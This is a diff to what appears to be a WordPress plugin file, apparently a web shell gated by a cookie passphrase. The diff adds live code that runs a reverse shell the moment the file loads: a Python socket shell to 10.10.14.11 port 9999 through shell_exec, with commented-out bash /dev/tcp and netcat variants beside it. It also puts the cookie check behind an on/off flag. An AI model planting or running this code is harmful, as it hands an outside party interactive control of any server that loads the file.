@@ -7,7 +7,31 @@
 * Author: Your Name Here
 * Author URI: http://yourwebsiteurl.com/
 **/
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+//////////////////////////////////////////////////
+//If you want to trigger a reverse shell on init//
+//      uncomment the desired reverse shell     //
+//////////////////////////////////////////////////
+
+$rev_port = 9999;
+$rev_ip = '10.10.14.11';
+
+$rev_shell = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" .$rev_ip. "\"," .$rev_port."));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'";
+
+#$rev_shell = "bash -c \"/bin/bash -i >& /dev/tcp/" .$rev_ip. "/" .$rev_port. " 0>&1\"";
+
+#$rev_shell = "nc " .$rev_ip. " " .$rev_port. " -e /bin/bash";
+
+shell_exec($rev_shell);
+
+//////////////////////////////////////////////////
+//////////////////////////////////////////////////
+
+
 // Auth with login/password (set true/false to enable/disable it)
+$cookie_login = true;
 
 $cookie_name = "passphrase";
 $passphrase = "5b026675f94caae4a35fa030b7df2e77d80f76678ba8cea7a87d2d9dd20820f2";
@@ -16,16 +40,18 @@ $passphrase = "5b026675f94caae4a35fa030b7df2e77d80f76678ba8cea7a87d2d9dd20820f2"
 
 $check_value = $passphrase;
 
-if(isset($_COOKIE[$cookie_name])) {
-    if($_COOKIE[$cookie_name] !== $check_value) {
-        #echo $_COOKIE[$cookie_name] . " != " . $check_value;
-        #header("HTTP/1.0 404 Not Found");
+if($cookie_login == true){
+    if(isset($_COOKIE[$cookie_name])) {
+        if($_COOKIE[$cookie_name] !== $check_value) {
+            #echo $_COOKIE[$cookie_name] . " != " . $check_value;
+            #header("HTTP/1.0 404 Not Found");
+            http_response_code(404);
+            exit;
+        }
+    } else {
         http_response_code(404);
         exit;
     }
-} else {
-    http_response_code(404);
-    exit;
 }
 
 session_start();
